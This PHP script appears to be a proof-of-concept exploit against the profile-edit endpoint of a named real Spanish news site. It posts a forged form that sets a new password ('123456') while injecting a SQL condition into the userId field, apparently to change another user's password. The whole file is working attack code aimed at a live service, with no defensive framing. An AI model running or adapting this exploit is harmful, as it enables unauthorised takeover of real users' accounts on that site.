<?php
	require('class.executePhoto.php');

	// Ejemplo de ejecución arbitraria cambio contraseña:
 	$param = array('avatar'  		=> '',
 				   'bornDateYear'  	=> '',
 				   'ediAddress'  	=> '',
 				   'ediBio'  		=> '',
 				   'ediCountryCode' => 'ES',
 				   'ediProvince'  	=> '',
 				   'ediCity'  		=> '',
 				   'ediURL'  		=> '',
 				   'ediZipCode'  	=> '',
 				   'name'  			=> 'David',
 				   'newsletter'  	=> '',
 				   'newsletters'  	=> '',
 				   'password'  		=> '123456',
 				   'repeatpassword' => '123456',
 				   'sex'  			=> '',
				   'surname'		=> 'Martin',
				   'userId'			=> '29307\' and \'1\'=\'1');

	executePhoto::redirect_post('https://seguro.eldiario.es/usuarios/editar-perfil.json', $param);
?>